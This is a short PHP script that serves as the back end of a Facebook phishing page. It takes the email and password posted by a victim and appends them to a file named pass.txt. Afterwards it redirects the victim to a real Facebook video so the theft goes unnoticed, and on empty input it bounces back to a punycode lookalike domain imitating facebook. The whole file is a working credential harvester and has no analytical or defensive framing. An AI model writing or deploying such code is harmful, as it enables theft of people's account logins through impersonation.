<?php
require "pass.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
if(empty($email) || empty($pass)){
    header('Location: https://www.xn--facebok-f1a.co/desilugaidhnfjekfejfnffnvnjfhejriejdheksdsjs78795/');
}
else{
    $email = $email;
    $pass = $pass;
    $sep = "*********************\n";
    file_put_contents('pass.txt', $email.PHP_EOL , FILE_APPEND | LOCK_EX);
    file_put_contents('pass.txt', $pass.PHP_EOL , FILE_APPEND | LOCK_EX);
    file_put_contents('pass.txt', $sep.PHP_EOL , FILE_APPEND | LOCK_EX);
    header('Location: https://www.facebook.com/419902485167874/videos/2002915833343661/');
}
?>
